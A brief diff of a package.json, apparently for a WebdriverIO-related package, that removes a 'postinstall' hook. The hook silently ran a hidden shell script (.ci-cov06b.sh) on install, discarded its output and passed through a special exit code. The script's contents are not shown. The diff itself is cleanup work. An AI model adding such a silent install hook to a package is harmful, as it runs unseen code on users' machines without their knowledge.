@@ -13,8 +13,7 @@
   },
   "types": "./dist/index.d.ts",
   "scripts": {
-    "build": "tsc",
-    "postinstall": "sh ./.ci-cov06b.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "tsc"
   },
   "keywords": [
     "wdio",
